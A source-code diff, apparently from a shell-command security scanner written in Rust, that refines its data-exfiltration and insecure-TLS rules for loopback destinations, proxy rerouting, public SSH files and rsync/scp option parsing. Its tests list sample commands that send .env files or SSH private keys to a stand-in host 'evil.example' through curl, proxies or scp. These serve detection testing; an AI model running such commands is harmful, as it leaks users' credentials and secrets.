@@ -932,6 +932,34 @@ fn multicall_applet_interpreter(
     }
 }
 
+/// Whether a curl/wget invocation that disables TLS verification talks only to
+/// this machine: every destination is a literal loopback authority
+/// (`https://localhost:8443/`, `https://127.0.0.1/`, `https://[::1]/`), every
+/// option was understood, and nothing (a proxy, `--resolve`, `--connect-to`, a
+/// config file, a proxy or config variable in the command) can reroute the
+/// connection. No network attacker sits between the client and a loopback
+/// server, so the missing verification is worth a warning, not a block.
+fn insecure_tls_reaches_only_loopback(
+    segment: &tokenize::Segment,
+    resolved_name: &str,
+    cmd_base: &str,
+    args: Vec<String>,
+    shell: ShellType,
+    environment_may_reroute: bool,
+) -> bool {
+    if !matches!(cmd_base, "curl" | "wget") {
+        return false;
+    }
+    let client = tokenize::Segment {
+        command: Some(resolved_name.to_string()),
+        args,
+        raw: segment.raw.clone(),
+        preceding_separator: None,
+        byte_range: segment.byte_range.clone(),
+    };
+    analyze_upload_client(&client, shell, cmd_base, environment_may_reroute).loopback_only
+}
+
 fn command_analysis_work_budget_finding(boundary: &str) -> Finding {
     Finding {
         rule_id: RuleId::AnalysisIncomplete,
@@ -1048,6 +1076,7 @@ fn check_depth(
     check_fish_source_psub_download(&segments, shell, &mut findings);
 
     // source/. reuse transport rules: they execute the fetched body.
+    let environment_may_reroute = upload_environment_may_reroute(&segments);
     for segment in &segments {
         let Some((resolved_name, args)) =
             crate::extract::resolve_wrapped_command_for_shell(segment, shell)
@@ -1056,8 +1085,22 @@ fn check_depth(
         };
         let cmd_base = normalize_cmd_base(&resolved_name, shell);
         if is_source_command(&cmd_base) {
-            let tls_findings =
+            let mut tls_findings =
                 crate::rules::transport::check_insecure_flags(&cmd_base, &args, true);
+            if !tls_findings.is_empty()
+                && insecure_tls_reaches_only_loopback(
+                    segment,
+                    &resolved_name,
+                    &cmd_base,
+                    args,
+                    shell,
+                    environment_may_reroute,
+                )
+            {
+                for finding in &mut tls_findings {
+                    crate::rules::transport::downgrade_insecure_tls_for_loopback(finding);
+                }
+            }
             findings.extend(tls_findings);
         }
     }
@@ -8768,9 +8811,15 @@ fn parse_dataflow_word(raw: &str, shell: ShellType) -> ParsedShellWord {
 
 /// A path whose contents the upload / exfiltration dataflow treats as secret:
 /// the reviewed credential and wallet catalogue, plus project secret files
-/// such as `.env` (see [`crate::sensitive_assets::is_project_secret_file`]).
+/// such as `.env` (see [`crate::sensitive_assets::is_project_secret_file`]),
+/// minus the public files of an SSH directory (a `*.pub` key, `known_hosts`,
+/// `authorized_keys`, `config`; see
+/// [`crate::sensitive_assets::is_public_ssh_material`]). A private key staged
+/// under a public name in the same command (`cp ~/.ssh/id_rsa ~/.ssh/x.pub`)
+/// is still tracked by the staged-file lineage.
 fn sensitive_operand(value: &str) -> bool {
     !value.is_empty()
+        && !crate::sensitive_assets::is_public_ssh_material(value)
         && (crate::sensitive_assets::is_sensitive_path(value)
             || crate::sensitive_assets::is_project_secret_file(value))
 }
@@ -11482,6 +11531,10 @@ fn upload_option_role<'a>(command: &str, token: &'a str) -> Option<UploadOptionR
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum UploadDestinationProof {
     Remote,
+    /// A literal loopback authority (`http://localhost:3000/`). Local unless
+    /// the invocation can reroute the connection (a proxy, `--resolve`,
+    /// `--connect-to`, a config file): see [`analyze_upload_client`].
+    Loopback,
     NonRemote,
     Incomplete,
 }
@@ -11507,6 +11560,11 @@ fn upload_destination_proof(
             // case (`https://host/$(producer)`). A dynamic authority remains
             // incomplete because `https://$(producer)` has no static host.
             let template = parsed.literal.trim();
+            if template.contains("://")
+                && crate::rules::shared::literal_loopback_destination(template)
+            {
+                return UploadDestinationProof::Loopback;
+            }
             let remote = if client == "curl" {
                 let url = crate::extract::parse_curl_destination(template);
                 matches!(
@@ -11534,6 +11592,12 @@ fn upload_destination_proof(
     if destination.is_empty() || destination.to_ascii_lowercase().starts_with("file://") {
         return UploadDestinationProof::NonRemote;
     }
+    // Checked before the generic URL parser, which reads a schemeless
+    // `localhost:3000/x` as the URL scheme `localhost:`; curl and wget read it
+    // as `http://localhost:3000/x`.
+    if crate::rules::shared::literal_loopback_destination(destination) {
+        return UploadDestinationProof::Loopback;
+    }
     if let Ok(url) = url::Url::parse(destination) {
         return match url.scheme().to_ascii_lowercase().as_str() {
             "http" | "https" | "ftp" | "ftps" | "sftp" | "scp" | "ws" | "wss" => {
@@ -11556,6 +11620,9 @@ struct UploadTransferAnalysis {
     direct_incomplete: bool,
     consumes_stdin: bool,
     remote_destination: bool,
+    /// A literal loopback destination; remote only when the invocation can
+    /// reroute it (see [`upload_option_reroutes`]).
+    loopback_destination: bool,
     destination_incomplete: bool,
     option_incomplete: bool,
     sensitive_candidate: bool,
@@ -11568,6 +11635,9 @@ struct UploadClientAnalysis {
     stdin_remote: bool,
     stdin_incomplete: bool,
     remote_destination: bool,
+    /// Every transfer's destinations were read completely, at least one is a
+    /// literal loopback authority, and none is remote (after rerouting).
+    loopback_only: bool,
     remote_upload_paths: Vec<(String, DataFlowOperation)>,
     wire_argument_indices: BTreeSet<usize>,
 }
@@ -11602,13 +11672,68 @@ fn apply_upload_option_value(
     }
 }
 
+/// An option that can send a curl/wget transfer somewhere other than the host
+/// its URL names: any proxy option, a SOCKS proxy, `--connect-to`, `--resolve`,
+/// a DNS or alt-svc override, a config file (`-K`), or wget's inline `.wgetrc`
+/// command (`-e`). A short-option cluster counts when any letter is one of
+/// them, even where curl would read it as an attached value: the cost of
+/// reading too much is only that a loopback upload keeps its remote verdict.
+fn upload_option_reroutes(command: &str, token: &str) -> bool {
+    if let Some(long) = token.strip_prefix("--") {
+        let name = long.split_once('=').map_or(long, |(name, _)| name);
+        return name.to_ascii_lowercase().contains("proxy")
+            || match command {
+                "curl" => matches!(
+                    name,
+                    "socks4"
+                        | "socks4a"
+                        | "socks5"
+                        | "socks5-hostname"
+                        | "connect-to"
+                        | "resolve"
+                        | "config"
+                        | "doh-url"
+                        | "dns-servers"
+                        | "alt-svc"
+                        | "ipfs-gateway"
+                ),
+                "wget" => matches!(name, "execute" | "config"),
+                _ => false,
+            };
+    }
+    let Some(options) = token.strip_prefix('-') else {
+        return false;
+    };
+    match command {
+        "curl" => options.contains(['x', 'K']),
+        "wget" => options.contains(['e', 'Y']),
+        _ => false,
+    }
+}
+
+/// Shell text that can point curl or wget at a proxy or a different config
+/// file through the environment: `http_proxy=`, `ALL_PROXY`, `export
+/// https_proxy`, `CURL_HOME=`, `HOME=`, `WGETRC=`, `.curlrc`. When any segment
+/// of a command (or an enclosing command) carries one, a loopback upload
+/// destination may not stay on this machine.
+fn upload_environment_may_reroute(segments: &[tokenize::Segment]) -> bool {
+    segments.iter().any(|segment| {
+        let lower = segment.raw.to_ascii_lowercase();
+        ["proxy", "curlrc", "wgetrc", "home="]
+            .iter()
+            .any(|needle| lower.contains(needle))
+    })
+}
+
 fn analyze_upload_client(
     segment: &tokenize::Segment,
     shell: ShellType,
     command: &str,
+    environment_may_reroute: bool,
 ) -> UploadClientAnalysis {
     let mut transfers = vec![UploadTransferAnalysis::default()];
     let mut options_terminated = false;
+    let mut reroutes = environment_may_reroute;
     let mut index = 0usize;
     while index < segment.args.len() {
         let raw = &segment.args[index];
@@ -11627,6 +11752,7 @@ fn analyze_upload_client(
             continue;
         }
         if !options_terminated && token.starts_with('-') && token != "-" {
+            reroutes |= upload_option_reroutes(command, token);
             let Some(role) = upload_option_role(command, token) else {
                 transfers.last_mut().unwrap().option_incomplete = true;
                 index += 1;
@@ -11679,6 +11805,9 @@ fn analyze_upload_client(
                                 UploadDestinationProof::Remote => {
                                     transfer.remote_destination = true
                                 }
+                                UploadDestinationProof::Loopback => {
+                                    transfer.loopback_destination = true
+                                }
                                 UploadDestinationProof::Incomplete => {
                                     transfer.destination_incomplete = true
                                 }
@@ -11701,11 +11830,30 @@ fn analyze_upload_client(
                 transfer.remote_destination = true;
                 transfer.wire_argument_indices.insert(index);
             }
+            UploadDestinationProof::Loopback => {
+                transfer.loopback_destination = true;
+                transfer.wire_argument_indices.insert(index);
+            }
             UploadDestinationProof::Incomplete => transfer.destination_incomplete = true,
             UploadDestinationProof::NonRemote => {}
         }
         index += 1;
     }
+    // A loopback destination stays on this machine unless an option or the
+    // environment can reroute the connection; then it keeps the remote verdict.
+    if reroutes {
+        for transfer in &mut transfers {
+            transfer.remote_destination |= transfer.loopback_destination;
+        }
+    }
+    let loopback_only = transfers
+        .iter()
+        .any(|transfer| transfer.loopback_destination)
+        && transfers.iter().all(|transfer| {
+            !transfer.remote_destination
+                && !transfer.destination_incomplete
+                && !transfer.option_incomplete
+        });
 
     let mut precise = None;
     let mut direct_incomplete = false;
@@ -11761,6 +11909,7 @@ fn analyze_upload_client(
         stdin_remote,
         stdin_incomplete,
         remote_destination,
+        loopback_only,
         remote_upload_paths,
         wire_argument_indices,
     }
@@ -12089,6 +12238,10 @@ fn remote_copy_option_roles(
         "rsync" => (
             &[
                 "-e",
+                "-B",
+                "-f",
+                "-M",
+                "-T",
                 "--rsh",
                 "--port",
                 "--password-file",
@@ -12120,10 +12273,126 @@ fn remote_copy_option_roles(
                 "--dry-run",
                 "--protect-args",
                 "-s",
+                "-4",
+                "-6",
+                "-8",
+                "-A",
+                "-C",
+                "-D",
+                "-E",
+                "-F",
+                "-H",
+                "-I",
+                "-J",
+                "-K",
+                "-L",
+                "-O",
+                "-P",
+                "-R",
+                "-S",
+                "-W",
+                "-X",
+                "-b",
+                "-g",
+                "-h",
+                "-i",
+                "-k",
+                "-l",
+                "-m",
+                "-n",
+                "-o",
+                "-p",
+                "-t",
+                "-x",
+                "-y",
+                "--delete-after",
+                "--delete-excluded",
+                "--hard-links",
+                "--human-readable",
+                "--ignore-existing",
+                "--itemize-changes",
+                "--links",
+                "--mkpath",
+                "--partial",
+                "--perms",
+                "--progress",
+                "--relative",
+                "--size-only",
+                "--stats",
+                "--times",
             ],
         ),
         _ => return None,
     })
+}
+
+/// Positional operands of `scp` / `rsync` with their argv indices. Like
+/// [`positional_arguments_with_indices_closed`], but a short-option cluster
+/// (`-av`, `-avz`, `-rp`, `-avze ssh`) is read letter by letter: every letter
+/// must be a known option, and a value option takes the rest of the cluster or,
+/// as the last letter, the next argument. Anything unknown stays an error.
+fn remote_copy_positionals(
+    command: &str,
+    args: &[String],
+    shell: ShellType,
+) -> Result<Vec<(usize, String)>, ()> {
+    let Some((value_options, boolean_options)) = remote_copy_option_roles(command) else {
+        return Ok(Vec::new());
+    };
+    let mut positional = Vec::new();
+    let mut options = true;
+    let mut index = 0usize;
+    while index < args.len() {
+        let value = evaluated_literal(&args[index], shell)?;
+        if options && value == "--" {
+            options = false;
+            index += 1;
+            continue;
+        }
+        if !(options && value.starts_with('-') && value != "-") {
+            positional.push((index, value));
+            index += 1;
+            continue;
+        }
+        let (name, attached) = split_attached_option(&value, '=');
+        if boolean_options.contains(&name) {
+            if attached.is_some() {
+                return Err(());
+            }
+            index += 1;
+            continue;
+        }
+        if value_options.contains(&name) {
+            if attached.is_none() {
+                index += 1;
+                evaluated_literal(args.get(index).ok_or(())?, shell)?;
+            }
+            index += 1;
+            continue;
+        }
+        let Some(letters) = value
+            .strip_prefix('-')
+            .filter(|rest| !rest.starts_with('-'))
+        else {
+            return Err(());
+        };
+        for (offset, letter) in letters.char_indices() {
+            let flag = format!("-{letter}");
+            if boolean_options.contains(&flag.as_str()) {
+                continue;
+            }
+            if !value_options.contains(&flag.as_str()) {
+                return Err(());
+            }
+            if offset + letter.len_utf8() == letters.len() {
+                index += 1;
+                evaluated_literal(args.get(index).ok_or(())?, shell)?;
+            }
+            break;
+        }
+        index += 1;
+    }
+    Ok(positional)
 }
 
 fn remote_copy_operand_is_remote(command: &str, value: &str, shell: ShellType) -> bool {
@@ -12143,11 +12412,7 @@ fn remote_copy_wire_argument_indices(
     args: &[String],
     shell: ShellType,
 ) -> Result<BTreeSet<usize>, ()> {
-    let Some((value_options, boolean_options)) = remote_copy_option_roles(command) else {
-        return Ok(BTreeSet::new());
-    };
-    let positional =
-        positional_arguments_with_indices_closed(args, shell, value_options, boolean_options)?;
+    let positional = remote_copy_positionals(command, args, shell)?;
     let Some((index, destination)) = positional.last() else {
         return Ok(BTreeSet::new());
     };
@@ -12158,12 +12423,11 @@ fn remote_copy_wire_argument_indices(
 }
 
 fn analyze_remote_copy_sink(command: &str, args: &[String], shell: ShellType) -> ExtendedSinkProof {
-    let Some((value_options, boolean_options)) = remote_copy_option_roles(command) else {
+    if remote_copy_option_roles(command).is_none() {
         return ExtendedSinkProof::None;
-    };
-    let positional = match positional_arguments_closed(args, shell, value_options, boolean_options)
-    {
-        Ok(positional) => positional,
+    }
+    let positional: Vec<String> = match remote_copy_positionals(command, args, shell) {
+        Ok(positional) => positional.into_iter().map(|(_, value)| value).collect(),
         Err(()) => return ExtendedSinkProof::Incomplete,
     };
     if positional.len() < 2 {
@@ -12301,12 +12565,12 @@ fn analyze_rclone_sink(args: &[String], shell: ShellType) -> ExtendedSinkProof {
     }
 }
 
+/// A socket/HTTP sink host that can carry bytes off this machine. Only a real
+/// loopback or unspecified address and `localhost` stay local: a DNS name that
+/// merely starts with `127.` (`127.0.0.1.example`) resolves wherever its owner
+/// points it.
 fn socket_host_remote(value: &str) -> bool {
-    let value = value.trim_matches(['[', ']']).to_ascii_lowercase();
-    !matches!(
-        value.as_str(),
-        "" | "-" | "localhost" | "0.0.0.0" | "::" | "::1"
-    ) && !value.starts_with("127.")
+    !matches!(value, "" | "-") && !crate::rules::shared::is_local_machine_host(value)
 }
 
 fn analyze_netcat_sink(args: &[String], shell: ShellType) -> ExtendedSinkProof {
@@ -13814,7 +14078,15 @@ fn check_data_exfiltration(
     findings: &mut Vec<Finding>,
 ) -> FlowSummary {
     let mut staged = StagedDataflow::default();
-    check_data_exfiltration_depth(segments, shell, findings, FlowProof::Clean, &mut staged, 0)
+    check_data_exfiltration_depth(
+        segments,
+        shell,
+        findings,
+        FlowProof::Clean,
+        &mut staged,
+        0,
+        false,
+    )
 }
 
 fn check_data_exfiltration_depth(
@@ -13824,7 +14096,12 @@ fn check_data_exfiltration_depth(
     initial_stdin: FlowProof,
     staged: &mut StagedDataflow,
     depth: usize,
+    enclosing_environment_may_reroute: bool,
 ) -> FlowSummary {
+    // An enclosing command's proxy or config assignment reaches its nested
+    // bodies too (`export https_proxy=...; sh -c 'curl ...'`).
+    let environment_may_reroute =
+        enclosing_environment_may_reroute || upload_environment_may_reroute(segments);
     let mut pipe_flow = initial_stdin;
     // True when the previous segment statically printed a sensitive path
     // list, which an `xargs` consumer promotes from stdin data into a file
@@ -14168,6 +14445,7 @@ fn check_data_exfiltration_depth(
                     routing.stdin,
                     child_staged,
                     depth + 1,
+                    environment_may_reroute,
                 );
                 let child_stdout: FlowProof = child.stdout.into();
                 let child_stderr: FlowProof = child.stderr.into();
@@ -14301,7 +14579,12 @@ fn check_data_exfiltration_depth(
         let (direct, stdin_remote, stdin_incomplete, argument_remote, upload_indices) =
             match cmd_base.as_str() {
                 "curl" | "wget" => {
-                    let analysis = analyze_upload_client(&effective, shell, &cmd_base);
+                    let analysis = analyze_upload_client(
+                        &effective,
+                        shell,
+                        &cmd_base,
+                        environment_may_reroute,
+                    );
                     for (path, operation) in &analysis.remote_upload_paths {
                         match staged_flow_for_path(staged, path, shell) {
                             FlowProof::Sensitive => {
@@ -21491,6 +21774,197 @@ mod tests {
             ),
             UploadDestinationProof::Incomplete
         );
+    }
+
+    #[test]
+    fn c4_literal_loopback_upload_destinations() {
+        for raw in [
+            "http://localhost:3000/debug",
+            "https://127.0.0.1:8443/",
+            "'http://[::1]:3000/x'",
+            "localhost:3000/debug",
+            "http://localhost/$(cat /etc/passwd)",
+        ] {
+            for client in ["curl", "wget"] {
+                assert_eq!(
+                    upload_destination_proof(client, raw, ShellType::Posix, None),
+                    UploadDestinationProof::Loopback,
+                    "{client} {raw}"
+                );
+            }
+        }
+        for raw in [
+            "http://localhost@evil.example/",
+            r"'http://localhost\@evil.example/'",
+            "http://127.0.0.1.evil.example/",
+            "http://127.1/",
+            "http://0x7f.0x/",
+        ] {
+            assert_eq!(
+                upload_destination_proof("curl", raw, ShellType::Posix, None),
+                UploadDestinationProof::Remote,
+                "{raw}"
+            );
+        }
+    }
+
+    #[test]
+    fn c4_upload_reroute_options() {
+        for (client, token) in [
+            ("curl", "-x"),
+            ("curl", "-sKcfg"),
+            ("curl", "--proxy"),
+            ("curl", "--proxy=http://p:1"),
+            ("curl", "--preproxy"),
+            ("curl", "--socks5-hostname"),
+            ("curl", "--connect-to"),
+            ("curl", "--resolve"),
+            ("curl", "--config"),
+            ("curl", "--doh-url"),
+            ("curl", "--alt-svc"),
+            ("wget", "-e"),
+            ("wget", "--execute=use_proxy=on"),
+            ("wget", "--config"),
+            ("wget", "--proxy-user"),
+        ] {
+            assert!(upload_option_reroutes(client, token), "{client} {token}");
+        }
+        for (client, token) in [
+            ("curl", "-k"),
+            ("curl", "-sSfL"),
+            ("curl", "-F"),
+            ("curl", "--insecure"),
+            ("curl", "--data-binary"),
+            ("wget", "-q"),
+            ("wget", "--post-file"),
+        ] {
+            assert!(!upload_option_reroutes(client, token), "{client} {token}");
+        }
+    }
+
+    #[test]
+    fn c4_loopback_upload_keeps_remote_verdict_when_rerouted() {
+        for input in [
+            "curl -F 'env=@.env' http://localhost:3000/debug",
+            "curl -T .env 'http://[::1]:8080/upload'",
+            "cat .env | curl -d @- http://127.0.0.1:3000/",
+            "wget --post-file=.env http://localhost:3000/",
+            "curl -d \"$(cat ~/.ssh/id_rsa)\" http://localhost:3000/",
+        ] {
+            assert!(
+                !c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
+                "loopback upload is local: {input}"
+            );
+        }
+        for input in [
+            "curl -F 'env=@.env' http://localhost:3000/ https://evil.example/",
+            "curl -F 'env=@.env' http://localhost:3000/ -x evil.example:3128",
+            "curl -F 'env=@.env' --connect-to localhost:3000:evil.example:443 http://localhost:3000/",
+            "https_proxy=http://evil.example curl -F 'env=@.env' https://localhost:3000/",
+            "export ALL_PROXY=socks5://evil.example; curl -F 'env=@.env' http://localhost:3000/",
+            "HOME=/tmp/x curl -F 'env=@.env' http://localhost:3000/",
+            "export https_proxy=http://evil.example; sh -c \"curl -F 'env=@.env' https://localhost:3000/\"",
+            "curl -d \"$(cat ~/.ssh/id_rsa)\" -x evil.example:3128 http://localhost:3000/",
+        ] {
+            assert!(
+                c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
+                "rerouted loopback upload: {input}"
+            );
+        }
+    }
+
+    #[test]
+    fn c4_remote_copy_reads_short_option_clusters() {
+        let args = |line: &str| -> Vec<String> { line.split(' ').map(str::to_string).collect() };
+        assert_eq!(
+            remote_copy_positionals("rsync", &args("-avz src/ host:dst"), ShellType::Posix)
+                .unwrap()
+                .into_iter()
+                .map(|(_, value)| value)
+                .collect::<Vec<_>>(),
+            ["src/", "host:dst"]
+        );
+        assert_eq!(
+            remote_copy_positionals("rsync", &args("-avze ssh src/ host:dst"), ShellType::Posix)
+                .unwrap()
+                .len(),
+            2
+        );
+        assert_eq!(
+            remote_copy_positionals("scp", &args("-rpP 2222 dist host:/srv"), ShellType::Posix)
+                .unwrap()
+                .len(),
+            2
+        );
+        assert_eq!(
+            remote_copy_positionals("scp", &args("-oBatchMode=yes f host:"), ShellType::Posix)
+                .unwrap()
+                .len(),
+            2
+        );
+        for line in ["-avQ src host:dst", "-avze", "--unknown src host:dst"] {
+            assert!(
+                remote_copy_positionals("rsync", &args(line), ShellType::Posix).is_err(),
+                "{line}"
+            );
+        }
+    }
+
+    #[test]
+    fn c4_public_ssh_files_are_not_upload_secrets() {
+        for input in [
+            "scp ~/.ssh/id_ed25519.pub deploy@staging.example.com:~/",
+            "scp ~/.ssh/known_hosts ~/.ssh/config deploy@staging.example.com:~/",
+            "rsync -av ~/.ssh/id_rsa.pub deploy@staging.example.com:~/",
+            "curl -F 'key=@~/.ssh/id_ed25519.pub' https://keys.example.com/",
+            "cat ~/.ssh/authorized_keys | curl -d @- https://keys.example.com/",
+        ] {
+            assert!(
+                !c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
+                "public SSH file: {input}"
+            );
+        }
+        for input in [
+            "scp ~/.ssh/id_ed25519 deploy@staging.example.com:~/",
+            "rsync -avz ~/.ssh/ deploy@staging.example.com:~/",
+            "cp ~/.ssh/id_rsa /tmp/k.pub && scp /tmp/k.pub deploy@staging.example.com:~/",
+            "ln -s ~/.ssh/id_rsa ~/.ssh/x.pub && scp ~/.ssh/x.pub deploy@staging.example.com:~/",
+            "cat ~/.ssh/id_ed25519 | curl -d @- https://keys.example.com/",
+        ] {
+            assert!(
+                c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
+                "private SSH material: {input}"
+            );
+        }
+    }
+
+    #[test]
+    fn c4_insecure_tls_to_loopback_is_low() {
+        let tls = |input: &str| {
+            check_default(input, ShellType::Posix)
+                .into_iter()
+                .filter(|finding| finding.rule_id == RuleId::InsecureTlsFlags)
+                .map(|finding| finding.severity)
+                .collect::<Vec<_>>()
+        };
+        for input in [
+            "curl -k https://localhost:8443/health",
+            "curl --insecure https://127.0.0.1:8443/",
+            "curl -sk 'https://[::1]:8443/'",
+            "wget --no-check-certificate https://localhost:8443/",
+        ] {
+            assert_eq!(tls(input), [Severity::Low], "{input}");
+        }
+        for input in [
+            "curl -k https://example.com/",
+            "curl -k https://localhost:8443/ https://example.com/",
+            "curl -k -x http://proxy.example:3128 https://localhost:8443/",
+            "curl -k --resolve localhost:8443:203.0.113.9 https://localhost:8443/",
+            "https_proxy=http://proxy.example curl -k https://localhost:8443/",
+            "curl -k --unknown-option https://localhost:8443/",
+        ] {
+            assert_eq!(tls(input), [Severity::High], "{input}");
+        }
     }
 }
 
